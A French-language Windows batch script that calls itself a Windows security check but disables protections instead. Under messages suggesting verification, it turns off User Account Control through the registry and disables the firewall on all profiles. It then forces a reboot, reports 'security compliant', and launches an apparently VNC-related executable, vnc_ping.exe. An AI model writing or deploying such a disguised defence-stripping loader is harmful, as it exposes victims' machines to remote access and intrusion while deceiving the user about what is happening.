@echo off
title Vérification sécurité Windows
color 0A

:: Vérifie les privilèges administrateur
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo.
    echo ⚠️ Ce script doit être exécuté en tant qu’administrateur.
    pause
    exit /b
)

echo ==============================
echo 🔍 Vérification de l’UAC et du Pare-feu Windows
echo ==============================

:: Vérifier l'état de l'UAC
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA | find "0x0" >nul
if %errorLevel%==0 (
    echo ✅ UAC déjà désactivé.
) else (
    echo 🛠️ Désactivation de l’UAC...
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul
    set REBOOT_REQUIRED=1
)

:: Vérifier le pare-feu
netsh advfirewall show allprofiles | find /I "ON" >nul
if %errorLevel%==0 (
    echo 🛡️ Pare-feu actif — désactivation...
    netsh advfirewall set allprofiles state off >nul
    set REBOOT_REQUIRED=1
) else (
    echo ✅ Pare-feu déjà désactivé.
)

:: Si redémarrage nécessaire
if defined REBOOT_REQUIRED (
    echo.
    echo 🔁 Des changements ont été effectués, le système va redémarrer...
    timeout /t 5 >nul
    shutdown /r /t 0
    exit /b
)

:: Si tout est désactivé, lancer le programme principal
echo.
echo ✅ Sécurité conforme — lancement du programme principal...
cd /d "%~dp0"

:: Si tu veux exécuter la version Python :
:: python vnc_ping.py

:: Si tu veux exécuter la version compilée :
start "" "%~dp0vnc_ping.exe"

exit /b
